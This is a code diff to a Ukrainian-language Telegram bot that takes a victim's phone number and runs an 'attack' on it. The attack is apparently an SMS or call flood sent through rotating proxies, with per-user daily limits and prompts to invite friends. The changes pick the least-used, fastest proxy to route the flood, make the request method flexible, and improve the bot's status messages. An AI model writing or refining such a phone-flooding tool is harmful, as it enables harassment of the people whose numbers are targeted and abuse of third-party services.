@@ -58,6 +58,8 @@ proxies_stats = []  # list of {entry, latency_ms}
 proxies_usage = {}  # key -> count
 proxies_usage_total = 0
 
+last_status_msg = {}  # chat_id -> message_id
+
 storage = MemoryStorage()
 bot = Bot(token=config.token)
 dp = Dispatcher(bot, storage=storage)
@@ -248,6 +250,9 @@ def build_proxy_params(entry):
         return url, auth
     except Exception:
         return None, None
+
+def proxy_key(entry):
+    return f"{entry['host']}:{entry['port']}:{entry.get('user','')}"
 
 async def check_single_proxy(entry):
     proxy_url, proxy_auth = build_proxy_params(entry)
@@ -492,6 +497,7 @@ async def admin_check_and_report_proxies(message: Message):
     if message.from_user.id not in ADMIN:
         await message.answer("Недостатньо прав.")
         return
+    placeholder = await message.answer("Перевіряю проксі…")
     stats = await check_and_update_proxies()
     lines = [f"Перевірено: {stats['total']}. Робочих: {stats['healthy']}.", ""]
     total_usage = sum(proxies_usage.values()) or 1
@@ -501,7 +507,10 @@ async def admin_check_and_report_proxies(message: Message):
         cnt = proxies_usage.get(key, 0)
         pct = round(cnt * 100.0 / total_usage, 1)
         lines.append(f"• {e['host']}:{e['port']} ({e['user']}) — {int(item['latency_ms'])} ms — навантаження: {pct}%")
-    await message.answer("\n".join(lines))
+    try:
+        await bot.edit_message_text("\n".join(lines), chat_id=placeholder.chat.id, message_id=placeholder.message_id)
+    except Exception:
+        await message.answer("\n".join(lines))
 
 # ПРОМОКОДЫ - АДМИН ПАНЕЛЬ
 
@@ -1190,7 +1199,15 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
                 
             timeout = aiohttp.ClientTimeout(total=5)
             async with aiohttp.ClientSession(timeout=timeout) as session:
-                async with session.post(url, **kwargs) as response:
+                method = kwargs.pop('method', 'POST')
+                # sanitize encodings to avoid brotli dependency
+                hdrs = kwargs.get('headers') or {}
+                try:
+                    hdrs['Accept-Encoding'] = 'gzip, deflate'
+                except Exception:
+                    pass
+                kwargs['headers'] = hdrs
+                async with session.request(method, url, **kwargs) as response:
                     if response.status == 200:
                         logging.info(f"Успіх - {number}")
         except asyncio.TimeoutError:
@@ -1275,23 +1292,36 @@ async def start_attack(number, chat_id):
     try:
         await check_and_update_proxies()
         snapshot = proxies_healthy.copy()
-        proxy_cycle = itertools.cycle(snapshot) if snapshot else None
-        # choose one proxy for the whole attack session
+        # choose least-used proxy (then by lower latency) for the whole attack session
         p_url = None
         p_auth = None
-        if proxy_cycle:
+        if snapshot:
             try:
-                entry = next(proxy_cycle)
-                key = f"{entry['host']}:{entry['port']}:{entry.get('user','')}"
+                # map latency by key
+                lat_by_key = {}
+                for item in proxies_stats:
+                    e = item['entry']
+                    lat_by_key[proxy_key(e)] = item.get('latency_ms', 999999)
+                # select min by (usage, latency)
+                best_entry = min(
+                    snapshot,
+                    key=lambda e: (proxies_usage.get(proxy_key(e), 0), lat_by_key.get(proxy_key(e), 999999))
+                )
+                key = proxy_key(best_entry)
                 proxies_usage[key] = proxies_usage.get(key, 0) + 1
-                p_url, p_auth = build_proxy_params(entry)
-                logging.info(f"Using proxy for attack: {entry['host']}:{entry['port']}")
+                p_url, p_auth = build_proxy_params(best_entry)
+                logging.info(f"Using proxy for attack: {best_entry['host']}:{best_entry['port']}")
             except Exception:
                 p_url, p_auth = None, None
         while (asyncio.get_event_loop().time() - start_time) < timeout:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
-                await bot.send_message(chat_id, "🛑 Атака зупинена користувачем.")
+                try:
+                    msg_id = last_status_msg.get(chat_id)
+                    if msg_id:
+                        await bot.edit_message_text("🛑 Атака зупинена користувачем.", chat_id=chat_id, message_id=msg_id)
+                except Exception:
+                    pass
                 return
             
             await ukr(number, chat_id, proxy_url=p_url, proxy_auth=p_auth)
@@ -1304,7 +1334,12 @@ async def start_attack(number, chat_id):
             await asyncio.sleep(0.1)
             
     except asyncio.CancelledError:
-        await bot.send_message(chat_id, "🛑 Атака зупинена.")
+        try:
+            msg_id = last_status_msg.get(chat_id)
+            if msg_id:
+                await bot.edit_message_text("🛑 Атака зупинена.", chat_id=chat_id, message_id=msg_id)
+        except Exception:
+            pass
     except Exception as e:
         logging.error(f"Помилка при виконанні атаки: {e}")
         await bot.send_message(chat_id, "❌ Сталася помилка при виконанні атаки.")
@@ -1326,9 +1361,13 @@ async def start_attack(number, chat_id):
     inline_keyboard2 = types.InlineKeyboardMarkup()
     code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
     inline_keyboard2 = inline_keyboard2.add(code_sub)
-    await bot.send_message(
-        chat_id=chat_id,
-        text=f"""👍 Атака на номер <i>{number}</i> завершена!
+    try:
+        msg_id = last_status_msg.get(chat_id)
+        if msg_id:
+            await bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=msg_id,
+                text=f"""👍 Атака на номер <i>{number}</i> завершена!
 
 🔥 Сподобалась робота бота? 
 Допоможи нам зростати — запроси друга!
@@ -1336,9 +1375,10 @@ async def start_attack(number, chat_id):
 💬 Якщо є питання або пропозиції, звертайся до @Nobysss
 
 Приєднуйся до нашого ком'юніті 👇""",
-        parse_mode="html",
-        reply_markup=inline_keyboard2
-    )
+                parse_mode="html"
+            )
+    except Exception:
+        pass
 
 @dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
 @dp.throttled(anti_flood, rate=3)
@@ -1391,7 +1431,12 @@ async def handle_phone_number(message: Message):
             )
         cancel_keyboard = get_cancel_keyboard()
         attack_flags[chat_id] = True 
-        await message.answer(f'🎯 Місія розпочата!\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Статус: В процесі...', parse_mode="html", reply_markup=get_cancel_keyboard())
+        status_msg = await message.answer(
+            f'🎯 Місія розпочата!\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Статус: В процесі...',
+            parse_mode="html",
+            reply_markup=get_cancel_keyboard()
+        )
+        last_status_msg[chat_id] = status_msg.message_id
 
         asyncio.create_task(start_attack(number, chat_id))
     else:
@@ -1402,6 +1447,12 @@ async def cancel_attack(callback_query: types.CallbackQuery):
     chat_id = callback_query.message.chat.id
     attack_flags[chat_id] = False
     await callback_query.answer("Зупиняємо...")
+    try:
+        msg_id = last_status_msg.get(chat_id)
+        if msg_id:
+            await bot.edit_message_text("🛑 Зупиняємо атаку...", chat_id=chat_id, message_id=msg_id)
+    except Exception:
+        pass
 
 async def check_attack_limits(user_id: int):
     today = datetime.now().date()
